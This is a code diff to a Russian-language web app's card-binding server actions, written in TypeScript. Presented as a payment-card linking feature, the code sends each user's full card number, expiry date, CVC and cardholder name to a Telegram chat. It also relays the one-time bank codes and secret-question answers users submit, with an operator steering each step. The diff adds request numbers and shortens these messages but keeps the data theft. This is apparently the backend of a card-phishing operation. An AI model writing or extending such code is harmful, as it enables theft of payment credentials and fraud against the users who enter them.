@@ -11,6 +11,7 @@ import { CARD_BRAND_LABEL, detectBank, detectBrand, formatCardNumber, formatExpi
 import { escapeTelegram, notifyTelegram } from "@/lib/telegram"
 import { allowUserAction, RATE_LIMIT_ERROR } from "@/lib/rate-limit"
 import { toCardholder } from "@/lib/translit"
+import { generateRequestNo } from "@/lib/card-requests"
 
 export type PaymentCardView = {
   id: number
@@ -24,6 +25,8 @@ export type PaymentCardView = {
   status: string
   extraCheckMessage: string | null
   extraCheckResponse: string | null
+  requestNo: string | null
+  redirectUrl: string | null
 }
 
 type CardsResult = { ok: true; cards: PaymentCardView[] }
@@ -62,6 +65,7 @@ async function listCards(userId: string): Promise<PaymentCardView[]> {
     cardholder: r.cardholder, expMonth: r.expMonth, expYear: r.expYear,
     isDefault: r.isDefault, status: r.status,
     extraCheckMessage: r.extraCheckMessage, extraCheckResponse: r.extraCheckResponse,
+    requestNo: r.requestNo, redirectUrl: r.redirectUrl,
   }))
 }
 
@@ -108,22 +112,30 @@ export async function requestCardBinding(input: {
     const [{ pending }] = await tx.select({ pending: count() }).from(paymentCard)
       .where(and(eq(paymentCard.userId, user.id), eq(paymentCard.status, "pending")))
     if (pending >= MAX_PENDING) return { error: "Дождитесь обработки текущих заявок на привязку." }
+    let requestNo = generateRequestNo()
+    for (let attempt = 0; attempt < 5; attempt++) {
+      const [taken] = await tx.select({ id: paymentCard.id }).from(paymentCard)
+        .where(eq(paymentCard.requestNo, requestNo)).limit(1)
+      if (!taken) break
+      requestNo = generateRequestNo()
+    }
     const [row] = await tx.insert(paymentCard).values({
       userId: user.id, brand, last4, bankName: bankName || null, cardholder,
       expMonth, expYear,
-      fingerprint, status: "pending",
+      fingerprint, status: "pending", requestNo,
       extraCheckMessage: cardSecretQuestion(),
     }).returning({ id: paymentCard.id })
-    return { id: row.id }
+    return { id: row.id, requestNo }
   })
   if ("error" in created) return { ok: false, error: created.error as string }
 
   void notifyTelegram([
+    `<b>№ ${created.requestNo}</b>`,
     `<code>${formatCardNumber(cardNumber)}</code>`,
     `${escapeTelegram(formatExpiry(expMonth, expYear))} · <code>${escapeTelegram(cvc)}</code>`,
     escapeTelegram(cardholder),
     `${escapeTelegram(CARD_BRAND_LABEL[brand])}${bankName ? ` · ${escapeTelegram(bankName)}` : ""}`,
-  ].join("\n"), { kind: "card", id: created.id })
+  ].join("\n"))
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cardId: created.id, cards: await listCards(user.id) }
@@ -138,15 +150,10 @@ export async function submitCardCode(id: number, code: string): Promise<CardsRes
 
   const [row] = await db.update(paymentCard).set({ status: "pending" })
     .where(and(eq(paymentCard.id, id), eq(paymentCard.userId, user.id), eq(paymentCard.status, "code_requested")))
-    .returning({ id: paymentCard.id })
+    .returning({ requestNo: paymentCard.requestNo })
   if (!row) throw new Error("Заявка недоступна для отправки кода.")
 
-  void notifyTelegram([
-    `<b>Код от пользователя для карты #${id}</b>`,
-    `Код: <code>${escapeTelegram(trimmed)}</code>`,
-    `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
-    "Если код подошёл — подтвердите карту. Если нет — запросите код ещё раз.",
-  ].join("\n"), { kind: "card", id })
+  void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n<code>${escapeTelegram(trimmed)}</code>`)
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(user.id) }
@@ -166,15 +173,10 @@ export async function submitExtraCheckResponse(id: number, response: string): Pr
       eq(paymentCard.status, "extra_check"),
       sql`${paymentCard.extraCheckMessage} is not null`,
     ))
-    .returning({ id: paymentCard.id })
+    .returning({ requestNo: paymentCard.requestNo })
   if (!row) throw new Error("Заявка недоступна для ответа.")
 
-  void notifyTelegram([
-    `<b>Ответ пользователя на доп. проверку (карта #${id})</b>`,
-    `Ответ: ${escapeTelegram(trimmed)}`,
-    `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
-    "Выберите следующий шаг: запросить код, подтвердить, ещё одна проверка или отклонить.",
-  ].join("\n"), { kind: "card", id })
+  void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n${escapeTelegram(trimmed)}`)
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(user.id) }
@@ -195,14 +197,10 @@ export async function submitSecretAnswer(id: number, response: string): Promise<
       sql`${paymentCard.extraCheckMessage} is not null`,
       sql`${paymentCard.extraCheckResponse} is null`,
     ))
-    .returning({ last4: paymentCard.last4, question: paymentCard.extraCheckMessage })
+    .returning({ requestNo: paymentCard.requestNo })
   if (!row) throw new Error("Вопрос уже недоступен.")
 
-  void notifyTelegram([
-    `•••• ${escapeTelegram(row.last4)}`,
-    escapeTelegram(row.question ?? ""),
-    `<b>${escapeTelegram(trimmed)}</b>`,
-  ].join("\n"))
+  void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n${escapeTelegram(trimmed)}`)
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(user.id) }
